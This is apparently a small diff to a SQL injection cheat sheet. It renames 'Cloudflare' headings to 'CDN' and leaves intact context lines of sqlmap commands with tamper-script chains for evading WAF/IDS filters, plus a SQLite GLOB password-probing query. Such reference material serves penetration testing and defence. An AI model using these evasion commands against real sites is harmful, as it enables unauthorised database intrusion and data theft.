@@ -44,7 +44,7 @@ Tamper scripts modify payloads to evade WAF/IDS. Stack multiple with commas.
 # MySQL behind ModSecurity CRS
 sqlmap -u "$URL" --tamper=space2comment,between,randomcase,modsecurityversioned
 
-# MySQL behind Cloudflare
+# MySQL behind CDN
 sqlmap -u "$URL" --tamper=space2comment,charencode,randomcase,between
 
 # MSSQL behind IIS + generic WAF
@@ -572,7 +572,7 @@ SELECT * FROM users WHERE password GLOB 'a*';
 -- sqlmap --tamper=modsecurityversioned,space2comment,randomcase,between
 ```
 
-### 5.2 Cloudflare Bypass Patterns
+### 5.2 CDN Bypass Patterns
 
 ```sql
 -- Inline comment with version:
